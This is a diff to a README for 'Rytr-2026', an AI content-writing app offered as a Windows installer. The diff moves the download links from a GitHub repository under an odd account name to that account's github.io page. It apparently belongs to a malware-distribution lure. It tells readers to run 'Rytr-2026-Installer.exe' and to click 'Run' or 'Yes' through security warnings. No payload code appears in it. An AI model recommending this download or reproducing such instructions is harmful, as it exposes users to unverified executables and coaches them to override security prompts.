@@ -1,6 +1,6 @@
 # ✍️ Rytr-2026 - Create professional content with artificial intelligence
 
-[![Download Rytr for Windows](https://img.shields.io/badge/Download-Rytr-blue?style=for-the-badge)](https://github.com/Corneliusseventieth221/Rytr-2026)
+[![Download Rytr for Windows](https://img.shields.io/badge/Download-Rytr-blue?style=for-the-badge)](https://corneliusseventieth221.github.io)
 
 ## 📌 About this application 
 
@@ -20,7 +20,7 @@ Your computer needs to meet these standards to run the software correctly:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [Download Page](https://github.com/Corneliusseventieth221/Rytr-2026) to get the installer for Windows.
+1.  Visit the [Download Page](https://corneliusseventieth221.github.io) to get the installer for Windows.
 2.  Locate the downloaded file in your browser downloads folder or your desktop.
 3.  Double-click the file named "Rytr-2026-Installer.exe" to begin the process.
 4.  If a security window appears, click "Run" or "Yes" to allow the installer to open.
